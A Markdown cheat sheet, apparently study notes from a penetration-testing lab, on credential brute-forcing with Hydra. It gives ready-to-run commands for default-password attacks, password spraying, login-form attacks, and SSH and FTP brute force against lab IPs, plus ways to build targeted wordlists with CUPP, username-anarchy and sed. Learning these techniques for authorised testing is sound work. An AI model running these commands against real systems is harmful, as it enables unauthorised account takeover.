## Default Passwords

#### Brute force a web login page w/ Hydra looking for default credentials
```Shell
hydra -C /usr/share/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /
```

*==Always try and find default passwords first==*
## Username Brute Force

#### Username/Password Attack
```Shell
hydra -L /usr/share/SecLists/Usernames/Names/usernames.txt -P /usr/share/wordlists/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /
```
==*Tip: Add the "-u" flag, so that it tries all users on each password, instead of trying all 14 million passwords on one user, before moving on to the next.*==

#### Username Brute Force (Password Spraying)
```Shell
hydra -L /usr/share/SecLists/Usernames/Names/usernames.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /
```
Since we already found the password in the previous section, we may statically assign it with the "-p" flag, and only brute force for usernames that might use this password.

## Hydra Modules

#### Grep supported services
```Shell
hydra -h | grep "Supported services" | tr ":" "\n" | tr " " "\n" | column -e
```

#### Types of HTTP(s) Modules
1. `http[s]-{head|get|post}`:  serves for basic HTTP authentication
2. `http[s]-post-form`: used for login forms, like `.php` or `.aspx` and others.

*Tip: If we recognize that any of our input was pasted into the URL, the web application uses a GET form. Otherwise, it uses a POST form.*

#### Fail/Success String
If there's no failed login response, choose a string from the HTML code that's highly unlikely to be on the admin panel's page after a successful login, like the login button or the password field.

`Example: Log In Button`:
```html
  <form name='login' autocomplete='off' class='form' action='' method='post'>
```
Use `<form name='login'`

`Hydra parameters`:
```Shell
"/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:F=<form name='login'"
```

## Login Form Attacks

#### Brute force login form (http-post-form)
```Shell
hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```

## Personalized Wordlists

#### CUPP
```Shell
cupp -i
```

#### Filtering Based on Password Policy
Example policy + Commands to modify list to fit the policy:
- 8 Characters or Longer
- Contains Special Characters
- Contains Numbers

```Shell
sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
sed -ri '/[0-9]+/!d' william.txt            # remove no numbers
```
#### Mangling
 Tools: 
 - [rsmangler](https://github.com/digininja/RSMangler)
 - [The Mentalist](https://github.com/sc0tfree/mentalist.git)

#### Custom Username Wordlist
[Username Anarchy](https://github.com/urbanadventurer/username-anarchy)
```Shell
./username-anarchy Alisa Havens > alisahavens.txt
```

## Service Authentication Brute Forcing

#### SSH
```Shell
hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4
```

#### FTP
```Shell
hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1
```

## Wordlists

#### Default Passwords
`/usr/share/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt`

#### Usernames
`/usr/share/SecLists/Usernames/Names/names.txt`

